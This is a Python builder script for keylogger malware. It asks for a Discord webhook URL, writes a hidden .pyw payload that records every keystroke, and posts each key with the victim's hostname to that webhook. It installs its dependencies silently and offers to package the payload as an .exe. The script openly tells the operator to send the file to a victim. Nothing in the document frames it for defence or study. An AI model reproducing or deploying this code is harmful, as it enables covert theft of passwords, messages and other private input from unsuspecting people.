import socket
import os
from os import system
import time
try:
    import pynput
    from pynput.keyboard import Key, Listener
except:
    os.system("pip install pynput")
    import pynput
    from pynput.keyboard import Key, Listener
try:
    import colorama
    from colorama import Fore
except:
    os.system("pip install colorama")
    import colorama
    from colorama import Fore
try:
    from discord_webhook import DiscordWebhook, DiscordEmbed
except:
    os.system("pip install discord-webhook")
    from discord_webhook import DiscordWebhook, DiscordEmbed

clear = lambda: os.system('cls')
clear()
title = f'Key Logger'
system(f'title {title}')
print(f'\n[1] Classic Key Logger')

choice = input(f"\n[?]> ")

if choice == '1':
    webhook_url = input(f"Webhooks URL : ")
    qqq = input(f"file name : ")
    with open(f'{qqq}.pyw', 'x') as f:
        f.write(f'''
import socket
import os
from os import system
import time
try:
    import pynput
    from pynput.keyboard import Key, Listener
except:
    os.system("pip install pynput")
    import pynput
    from pynput.keyboard import Key, Listener
try:
    import colorama
    from colorama import Fore
except:
    os.system("pip install colorama")
    import colorama
    from colorama import Fore
try:
    from discord_webhook import DiscordWebhook, DiscordEmbed
except:
    os.system("pip install discord-webhook")
    from discord_webhook import DiscordWebhook, DiscordEmbed
content = ""

webhook = DiscordWebhook(url=f"{webhook_url}", username="KeyLogger", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
''''''
embed = DiscordEmbed(title=f"**KeyLogger**",  color=242424)
webhook.add_embed(embed)
test = socket.gethostname()
def on_press(key):
    web1 = f"{test} : " + "{0}".format(key)
    embed.set_description(f"{web1}")
    embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
    embed.set_footer(text="All In One - Discord Tools Program")
    embed.set_timestamp()
    response = webhook.execute()
clear = lambda: os.system('cls')
clear()

def on_release(key):
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
''')
    print(f'{Fore.LIGHTGREEN_EX}Key Logger saved to {qqq}.pyw')
    print(f'{Fore.GREEN}Now send Key Logger file to victim, if victim open it webhook will send his Key.')
    aaa = input(f"{Fore.RESET}Do you want to put your file in .exe? ({Fore.GREEN}y{Fore.RESET}/{Fore.RED}n{Fore.RESET}) : ")
    if aaa == 'y':
        from auto_py_to_exe import __main__ as apte
        apte.__name__ = '__main__'
        apte.run()
    elif aaa == 'n':
        pass
    else:
        print(f"'{aaa}' do not have a possible answer")
        time.sleep(2)
else:
    print(f"'{choice}' do not have a possible answer")
    time.sleep(2)